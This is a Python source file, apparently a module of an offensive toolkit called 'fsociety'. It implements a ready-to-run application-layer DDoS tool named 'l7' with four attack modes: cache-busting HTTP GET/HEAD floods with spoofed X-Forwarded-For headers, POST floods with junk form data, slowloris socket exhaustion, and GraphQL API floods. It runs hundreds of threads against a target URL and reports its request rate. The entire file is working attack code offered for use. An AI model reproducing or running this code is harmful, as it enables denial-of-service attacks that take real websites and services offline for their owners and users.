from __future__ import annotations

import http.client
import os
import random
import socket
import ssl
import string
import threading
import time
import urllib.parse
from fsociety.core.base import tool
from fsociety.core.logger import Log

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
]

class L7Engine:
    def __init__(self, args, log: Log):
        self.args = args
        self.log = log
        self.parsed = urllib.parse.urlparse(args.target if "://" in args.target else f"http://{args.target}")
        self.host = self.parsed.hostname or args.target
        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        self.use_ssl = self.parsed.scheme == "https" or self.port == 443
        self.path = self.parsed.path or "/"
        self.stop_event = threading.Event()
        self.stats = {"req": 0, "err": 0}
        self.lock = threading.Lock()

    def rand_str(self, n: int) -> str:
        return "".join(random.choices(string.ascii_letters + string.digits, k=n))

    def get_ctx(self):
        ctx = ssl.create_default_context()
        if self.args.insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def record(self, ok: bool):
        with self.lock:
            if ok: self.stats["req"] += 1
            else: self.stats["err"] += 1

    def raw_tcp_conn(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.host, self.port))
            if self.use_ssl:
                ctx = self.get_ctx()
                s = ctx.wrap_socket(s, server_hostname=self.host)
            return s
        except Exception: return None

    def attack_random(self):
        ctx = self.get_ctx() if self.use_ssl else None
        while not self.stop_event.is_set():
            try:
                if self.use_ssl: conn = http.client.HTTPSConnection(self.host, self.port, timeout=5, context=ctx)
                else: conn = http.client.HTTPConnection(self.host, self.port, timeout=5)
                
                cache_bust = self.rand_str(8)
                req_path = f"{self.path}?{self.rand_str(4)}={cache_bust}&cb={cache_bust}"
                headers = {
                    "User-Agent": random.choice(USER_AGENTS), "Accept": "*/*",
                    "Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache",
                    "Connection": "keep-alive",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                }
                method = "GET" if random.random() > 0.3 else "HEAD"
                conn.request(method, req_path, headers=headers)
                conn.getresponse().read(128)
                conn.close()
                self.record(True)
            except Exception: self.record(False)

    def attack_post(self):
        ctx = self.get_ctx() if self.use_ssl else None
        while not self.stop_event.is_set():
            try:
                if self.use_ssl: conn = http.client.HTTPSConnection(self.host, self.port, timeout=5, context=ctx)
                else: conn = http.client.HTTPConnection(self.host, self.port, timeout=5)
                
                body = f"user={self.rand_str(8)}&pass={self.rand_str(12)}&email={self.rand_str(6)}%40test.com&q={self.rand_str(16)}"
                headers = {
                    "User-Agent": random.choice(USER_AGENTS), "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/x-www-form-urlencoded", "Content-Length": str(len(body)),
                    "Connection": "keep-alive", "X-Requested-With": "XMLHttpRequest",
                }
                conn.request("POST", self.path, body=body, headers=headers)
                conn.getresponse().read(128)
                conn.close()
                self.record(True)
            except Exception: self.record(False)

    def attack_slow(self):
        sockets = []
        for _ in range(self.args.sockets):
            if self.stop_event.is_set(): break
            s = self.raw_tcp_conn()
            if not s: continue
            try:
                req = f"GET {self.path}?{self.rand_str(6)} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nAccept: */*\r\n".encode()
                s.send(req)
                sockets.append(s)
            except Exception:
                try: s.close()
                except: pass

        self.log.info(f"Opened {len(sockets)} slow sockets")
        while not self.stop_event.is_set():
            for s in list(sockets):
                try:
                    s.send(f"X-{self.rand_str(6)}: {self.rand_str(16)}\r\n".encode())
                    self.record(True)
                except Exception:
                    sockets.remove(s)
                    try: s.close()
                    except: pass
                    ns = self.raw_tcp_conn()
                    if ns:
                        try:
                            ns.send(f"GET {self.path}?{self.rand_str(6)} HTTP/1.1\r\nHost: {self.host}\r\n".encode())
                            sockets.append(ns)
                        except: pass
            time.sleep(self.args.drip)

    def attack_api(self):
        ctx = self.get_ctx() if self.use_ssl else None
        while not self.stop_event.is_set():
            try:
                if self.use_ssl: conn = http.client.HTTPSConnection(self.host, self.port, timeout=10, context=ctx)
                else: conn = http.client.HTTPConnection(self.host, self.port, timeout=10)
                
                body = '{"query":"{ user(id: ' + str(random.randint(1, 99999)) + ') { id name email posts { title body } } }"}'
                headers = {"User-Agent": random.choice(USER_AGENTS), "Content-Type": "application/json", "Accept": "application/json", "Connection": "keep-alive"}
                
                conn.request("POST", f"{self.path}/graphql", body=body, headers=headers)
                conn.getresponse().read(256)
                conn.close()
                self.record(True)
            except Exception: self.record(False)

    def start(self):
        if self.args.mode == "all": modes = ["random", "post", "slow", "api"]
        else: modes = [self.args.mode]

        threads = []
        per_mode_threads = self.args.threads // len(modes)

        for m in modes:
            self.log.info(f"Launching {m.upper()} vector with {per_mode_threads} threads")
            for _ in range(per_mode_threads):
                if m == "random": t = threading.Thread(target=self.attack_random)
                elif m == "post": t = threading.Thread(target=self.attack_post)
                elif m == "slow": t = threading.Thread(target=self.attack_slow)
                elif m == "api": t = threading.Thread(target=self.attack_api)
                t.daemon = True
                t.start()
                threads.append(t)

        start = time.time()
        last_req = 0
        try:
            while time.time() - start < self.args.duration:
                time.sleep(2)
                with self.lock: req = self.stats["req"]; err = self.stats["err"]
                pps = (req - last_req) / 2 if last_req else 0
                last_req = req
                self.log.info(f"RPS: {pps:.0f} | Sent: {req} | Errors: {err}")
        except KeyboardInterrupt: self.log.warn("interrupted")

        self.stop_event.set()
        for t in threads: t.join(timeout=1.0)
        self.log.ok("L7 flood stopped")

@tool("l7", "Application-layer DDoS: randomized HTTP, POST, API, and slowloris", category="dos")
class L7:
    @staticmethod
    def build_parser(p):
        p.add_argument("target", help="Target URL")
        p.add_argument("--mode", default="random", choices=["random", "post", "slow", "api", "all"])
        p.add_argument("--threads", type=int, default=200)
        p.add_argument("--duration", type=int, default=60)
        p.add_argument("--sockets", type=int, default=200, help="Slowloris socket count")
        p.add_argument("--drip", type=float, default=5.0, help="Slowloris drip interval")
        p.add_argument("--insecure", action="store_true")

    @staticmethod
    def run(args, log: Log) -> int:
        engine = L7Engine(args, log)
        engine.start()
        return 0
